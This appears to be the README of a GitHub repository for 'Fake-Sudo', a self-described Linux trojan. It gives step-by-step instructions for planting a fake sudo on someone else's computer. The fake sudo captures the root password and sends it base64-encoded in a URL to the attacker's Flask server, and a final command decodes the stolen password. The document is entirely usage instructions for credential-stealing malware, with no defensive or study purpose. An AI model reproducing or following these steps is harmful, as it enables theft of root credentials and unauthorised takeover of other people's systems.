# Fake-Sudo
A linux trojan
## How to use
1. Clone the repo<br>`git clone https://github.com/NarmakTwo/Fake-Sudo.git`<br>`cd Fake-Sudo`
2. Make a server<br>`python3 flask.py`
3. Go to the computer you want to steal the root password from
4. Clone the repo<br>`git clone https://github.com/NarmakTwo/Fake-Sudo.git`<br>`cd Fake-Sudo`
5. Setup the program<br>`chmod a+x setup.sh`<br>`source setup.sh`
6. Clear the screen<br>`clear`
7. Enter the public URL for the server you made (NOT 127.0.0.1)<br>`Site (include https:// or http://) <<< [your url]`
8. Once the server log says something, copy the end of the url and decode it<br>`echo [end of url] | base64 -d`, That's the root password!
9. That's it!
